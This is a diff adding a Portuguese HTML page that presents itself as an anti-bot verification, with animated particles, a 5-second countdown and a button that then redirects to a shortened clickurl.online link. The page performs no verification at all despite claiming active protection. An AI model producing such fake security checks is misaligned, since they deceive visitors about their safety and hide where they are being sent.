@@ -1,0 +1,341 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="color-scheme" content="dark" />
+  <title>Verificação contra bots</title>
+  <meta name="description" content="Verificação contra bots com timer de 5s, partículas animadas, glassmorphism e redirecionamento seguro." />
+  <style>
+    :root {
+      --bg-1: #0b1020;        /* fundo base escuro */
+      --bg-2: #0a0f1a;        /* tom adicional p/ gradiente */
+      --c-primary: #4da6ff;   /* azul principal */
+      --c-primary-soft: #80bfff; /* azul suave */
+      --text: #e9f1ff;        /* texto */
+      --muted: #b7c7e6;       /* texto suave */
+      --glass: rgba(255, 255, 255, 0.08);
+      --glass-border: rgba(255, 255, 255, 0.25);
+      --success: #33d17a;
+      --warning: #ffcc66;
+      --danger: #ff6b6b;
+      --shadow: 0 10px 30px rgba(0,0,0,.45), 0 4px 16px rgba(0,0,0,.25);
+      --radius: 20px;
+    }
+
+    * { box-sizing: border-box; }
+    html, body { height: 100%; }
+    body {
+      margin: 0; font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, "Helvetica Neue", Arial, "Noto Sans", "Liberation Sans", sans-serif;
+      color: var(--text);
+      background: radial-gradient(1200px 800px at 20% 20%, #0f1b34 0%, transparent 60%),
+                  radial-gradient(900px 900px at 80% 30%, #0a1530 0%, transparent 60%),
+                  linear-gradient(160deg, var(--bg-1), var(--bg-2));
+      overflow: hidden; /* para o canvas preencher o fundo */
+    }
+
+    /* Container principal (glassmorphism) */
+    .container {
+      position: relative;
+      width: min(960px, 92vw);
+      margin: 8vh auto 0;
+      padding: clamp(18px, 3.5vw, 36px);
+      background: linear-gradient(120deg, rgba(255,255,255,0.10), rgba(255,255,255,0.04));
+      border: 1px solid rgba(255,255,255,0.16);
+      border-radius: var(--radius);
+      backdrop-filter: blur(14px) saturate(140%);
+      -webkit-backdrop-filter: blur(14px) saturate(140%);
+      box-shadow: var(--shadow);
+      transform: translateY(10px);
+      opacity: 0;
+      animation: fadeInUp 800ms ease forwards 150ms;
+    }
+
+    @keyframes fadeInUp {
+      to { transform: translateY(0); opacity: 1; }
+    }
+
+    header {
+      display: flex; align-items: center; gap: 14px;
+      margin-bottom: clamp(14px, 2.5vw, 22px);
+    }
+
+    /* Ícone de segurança (escudo) em SVG animado */
+    .shield {
+      width: clamp(40px, 7vw, 64px); height: auto; flex: 0 0 auto;
+      filter: drop-shadow(0 6px 18px rgba(77,166,255,.45));
+      animation: bob 3.5s ease-in-out infinite;
+    }
+    .shield .core { fill: url(#gradShield); }
+    .shield .stroke { fill: none; stroke: rgba(255,255,255,.45); stroke-width: 1.25; }
+
+    @keyframes bob { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-6px); } }
+    @keyframes pulse { 0%, 100% { transform: scale(1); filter: drop-shadow(0 0 0 rgba(77,166,255,0.6)); } 50% { transform: scale(1.05); filter: drop-shadow(0 0 14px rgba(77,166,255,0.9)); } }
+
+    h1 { font-size: clamp(20px, 2.6vw, 30px); line-height: 1.2; margin: 0; }
+    p.lead { color: var(--muted); margin: 6px 0 0; font-size: clamp(14px, 1.8vw, 16px); }
+
+    /* Área principal */
+    .grid { display: grid; grid-template-columns: 1fr; gap: 18px; align-items: center; }
+    @media (min-width: 840px) {
+      .grid { grid-template-columns: 1.1fr .9fr; gap: 26px; }
+    }
+
+    /* Timer circular */
+    .timer {
+      --size: clamp(160px, 36vw, 240px);
+      width: var(--size); height: var(--size);
+      position: relative; display: grid; place-items: center; margin-inline: auto;
+    }
+    .timer svg { width: 100%; height: 100%; transform: rotate(-90deg); }
+    .timer .bg { stroke: rgba(255,255,255,0.12); stroke-width: 10; }
+    .timer .progress { stroke: url(#gradTimer); stroke-width: 10; stroke-linecap: round; transition: stroke-dashoffset .18s ease; filter: drop-shadow(0 2px 12px rgba(77,166,255,.6)); }
+    .timer .label {
+      position: absolute; inset: 0; display: grid; place-items: center;
+      font-weight: 700; font-variant-numeric: tabular-nums; letter-spacing: .5px;
+    }
+    .timer .seconds { font-size: clamp(32px, 8vw, 52px); }
+    .timer .hint { font-size: clamp(11px, 1.7vw, 13px); color: var(--muted); margin-top: 2px; }
+
+    /* Botão */
+    .actions { display: grid; gap: 12px; justify-items: center; }
+    .cta {
+      --btn-px: clamp(16px, 2.4vw, 22px);
+      border: 0; outline: none; cursor: not-allowed;
+      padding: 14px var(--btn-px);
+      font-size: clamp(14px, 2vw, 16px); font-weight: 700; letter-spacing: .3px;
+      border-radius: 999px; color: #0b1220;
+      background: linear-gradient(135deg, var(--c-primary), var(--c-primary-soft));
+      box-shadow: 0 6px 16px rgba(77,166,255, .35), inset 0 -2px 0 rgba(0,0,0,.25);
+      transition: transform .18s ease, box-shadow .18s ease, filter .18s ease, opacity .18s ease;
+      display: inline-flex; align-items: center; gap: 10px;
+      position: relative; isolation: isolate;
+      opacity: .75;
+    }
+    .cta .glow { position: absolute; inset: -2px; border-radius: inherit; background: radial-gradient(60% 60% at 50% 0%, rgba(255,255,255,.45), transparent 60%); opacity: .0; transition: opacity .25s ease; pointer-events: none; }
+    .cta svg { width: 18px; height: 18px; }
+
+    .cta.enabled { cursor: pointer; opacity: 1; }
+    .cta.enabled:hover { transform: translateY(-1px); box-shadow: 0 10px 24px rgba(77,166,255,.45), inset 0 -2px 0 rgba(0,0,0,.25); }
+    .cta.enabled:hover .glow { opacity: .6; }
+    .cta.enabled:active { transform: translateY(0); box-shadow: 0 6px 16px rgba(77,166,255,.35); }
+
+    /* Status */
+    .status { display: flex; align-items: center; gap: 10px; margin-top: 4px; font-size: clamp(12px, 1.7vw, 14px); color: var(--muted); }
+    .status .icon { width: 16px; height: 16px; }
+
+    /* Canvas de partículas ocupa o fundo inteiro */
+    #particles {
+      position: fixed; inset: 0; z-index: -1; display: block;
+    }
+
+    /* Acessibilidade: reduzir movimento */
+    @media (prefers-reduced-motion: reduce) {
+      .shield { animation: none; }
+      .cta, .timer .progress { transition: none; }
+    }
+
+    /* Rodapé sutil */
+    footer { text-align: center; color: #93a7c2; font-size: 12px; opacity: .7; margin-top: 8px; }
+    a.mini { color: var(--c-primary-soft); text-decoration: none; }
+  </style>
+</head>
+<body>
+  <!-- Canvas para partículas -->
+  <canvas id="particles" aria-hidden="true"></canvas>
+
+  <main class="container" role="main">
+    <header>
+      <!-- Escudo animado -->
+      <svg class="shield" viewBox="0 0 64 64" aria-hidden="true">
+        <defs>
+          <linearGradient id="gradShield" x1="0" y1="0" x2="1" y2="1">
+            <stop offset="0%" stop-color="#4da6ff"/>
+            <stop offset="100%" stop-color="#80bfff"/>
+          </linearGradient>
+        </defs>
+        <path class="core" d="M32 4c8 6 16 6 24 4v22c0 13-8.7 24.5-23.1 30C18.5 54.5 10 43 10 30V8c8 2 16 2 22-4z"/>
+        <path class="stroke" d="M32 4c8 6 16 6 24 4v22c0 13-8.7 24.5-23.1 30C18.5 54.5 10 43 10 30V8c8 2 16 2 22-4z"/>
+        <g style="transform-origin: 32px 32px; animation: pulse 2.2s ease-in-out infinite;">
+          <path fill="#0b1020" d="M28 34l-4-4 3-3 1 1 10-10 3 3-10 10 1 1-4 4z"/>
+        </g>
+      </svg>
+      <div>
+        <h1>Verificação contra bots, espere o tempo terminar para acessar o site</h1>
+        <p class="lead">Proteção ativa: confirme que você é humano aguardando o contador.</p>
+      </div>
+    </header>
+
+    <section class="grid" aria-live="polite">
+      <div class="timer" id="timer" aria-label="Contador de 5 segundos">
+        <svg viewBox="0 0 120 120" role="img" aria-hidden="true">
+          <defs>
+            <linearGradient id="gradTimer" x1="0" y1="0" x2="1" y2="1">
+              <stop offset="0%" stop-color="#4da6ff"/>
+              <stop offset="100%" stop-color="#80bfff"/>
+            </linearGradient>
+          </defs>
+          <circle class="bg" cx="60" cy="60" r="52"/>
+          <circle class="progress" cx="60" cy="60" r="52" stroke-dasharray="327" stroke-dashoffset="327"/>
+        </svg>
+        <div class="label">
+          <div class="seconds" id="seconds">5</div>
+          <div class="hint">segundos</div>
+        </div>
+      </div>
+
+      <div class="actions">
+        <button id="continueBtn" class="cta" disabled aria-disabled="true">
+          <span class="glow" aria-hidden="true"></span>
+          <!-- Cadeado -->
+          <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+            <path d="M7 10V8a5 5 0 0 1 10 0v2" stroke="#0b1220" stroke-width="2" stroke-linecap="round"/>
+            <rect x="5" y="10" width="14" height="10" rx="2" stroke="#0b1220" stroke-width="2"/>
+          </svg>
+          Acessar site com segurança
+        </button>
+        <div class="status" id="status">
+          <svg class="icon" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+            <path d="M12 6v6l4 2" stroke="#ffcc66" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+          <span>Aguardando conclusão do temporizador…</span>
+        </div>
+      </div>
+    </section>
+
+    <footer>
+      <small>Esta verificação ajuda a proteger o conteúdo de acessos automatizados.</small>
+    </footer>
+  </main>
+
+  <noscript>
+    <div style="position:fixed;inset:0;display:grid;place-items:center;background:#0b1020;color:#fff;padding:24px;text-align:center;">
+      <div style="max-width:560px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.16);backdrop-filter:blur(8px);padding:24px;border-radius:16px;">
+        <h2>JavaScript desativado</h2>
+        <p>Ative o JavaScript para concluir a verificação anti‑bot.</p>
+      </div>
+    </div>
+  </noscript>
+
+  <script>
+    // ======= Partículas animadas (fundo) =======
+    (function() {
+      const canvas = document.getElementById('particles');
+      const ctx = canvas.getContext('2d');
+      let DPR = Math.min(window.devicePixelRatio || 1, 2);
+      const baseCount = 40; // alvo ~40 (entre 30-50)
+      let particles = [];
+
+      function resize() {
+        const { innerWidth: w, innerHeight: h } = window;
+        canvas.width = Math.floor(w * DPR);
+        canvas.height = Math.floor(h * DPR);
+        canvas.style.width = w + 'px';
+        canvas.style.height = h + 'px';
+        // ajustar tamanho/número por dispositivo
+        const area = w * h;
+        const density = Math.min(Math.max(area / (12000 * (DPR)), 30), 60); // 30-60
+        const target = Math.round(Math.max(density, baseCount));
+        if (particles.length < target) {
+          for (let i = particles.length; i < target; i++) particles.push(makeParticle(w, h));
+        } else if (particles.length > target) {
+          particles.length = target;
+        }
+      }
+
+      function rand(min, max) { return Math.random() * (max - min) + min; }
+
+      function makeParticle(w, h) {
+        return {
+          x: rand(0, w) * DPR,
+          y: rand(0, h) * DPR,
+          r: rand(1.0, 2.4) * (1 + (DPR-1)*0.5),
+          a: rand(0.3, 0.9),
+          vx: rand(-0.12, 0.12) * DPR,
+          vy: rand(-0.08, 0.08) * DPR,
+        };
+      }
+
+      function step() {
+        const w = canvas.width, h = canvas.height;
+        ctx.clearRect(0, 0, w, h);
+        for (let p of particles) {
+          p.x += p.vx; p.y += p.vy;
+          // flutuação suave 
+          p.vx += (Math.random() - 0.5) * 0.01;
+          p.vy += (Math.random() - 0.5) * 0.01;
+          // wrap nas bordas
+          if (p.x < -20) p.x = w + 20; if (p.x > w + 20) p.x = -20;
+          if (p.y < -20) p.y = h + 20; if (p.y > h + 20) p.y = -20;
+          ctx.beginPath();
+          ctx.arc(p.x, p.y, p.r, 0, Math.PI*2);
+          const grd = ctx.createRadialGradient(p.x, p.y, 0, p.x, p.y, p.r * 2.2);
+          grd.addColorStop(0, `rgba(128,191,255,${p.a})`);
+          grd.addColorStop(1, 'rgba(128,191,255,0)');
+          ctx.fillStyle = grd;
+          ctx.fill();
+        }
+        requestAnimationFrame(step);
+      }
+
+      resize();
+      window.addEventListener('resize', resize, { passive: true });
+      requestAnimationFrame(step);
+    })();
+
+    // ======= Timer de 5s + progresso circular =======
+    (function(){
+      const DURATION = 5; // segundos
+      const progressCircle = document.querySelector('.progress');
+      const circumference = 2 * Math.PI * 52; // r=52
+      progressCircle.setAttribute('stroke-dasharray', String(circumference));
+      let remaining = DURATION;
+      const secondsEl = document.getElementById('seconds');
+      const btn = document.getElementById('continueBtn');
+      const status = document.getElementById('status');
+
+      function updateStatus(waiting) {
+        status.innerHTML = waiting
+          ? `<svg class="icon" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M12 6v6l4 2" stroke="#ffcc66" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg><span>Aguardando conclusão do temporizador…</span>`
+          : `<svg class="icon" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M5 13l4 4L19 7" stroke="#33d17a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg><span>Verificação concluída. Clique para continuar.</span>`;
+      }
+
+      function setEnabled() {
+        btn.removeAttribute('disabled');
+        btn.setAttribute('aria-disabled', 'false');
+        btn.classList.add('enabled');
+        updateStatus(false);
+      }
+
+      function tick() {
+        secondsEl.textContent = String(remaining);
+        const progress = (DURATION - remaining) / DURATION; // 0->1
+        const offset = circumference * (1 - progress);
+        progressCircle.style.strokeDashoffset = offset;
+        if (remaining <= 0) {
+          setEnabled();
+          return; // para de contar; usuário decide quando clicar
+        }
+        remaining--;
+        setTimeout(tick, 1000);
+      }
+
+      // Inicializa
+      updateStatus(true);
+      // inicia com círculo vazio
+      progressCircle.style.strokeDashoffset = circumference;
+      tick();
+
+      // Clique -> redireciona
+      btn.addEventListener('click', () => {
+        if (btn.hasAttribute('disabled')) return;
+        // pequena animação de feedback
+        btn.style.filter = 'brightness(1.08)';
+        setTimeout(() => {
+          window.location.href = 'https://clickurl.online/lYNxe';
+        }, 120);
+      });
+    })();
+  </script>
+</body>
+</html>
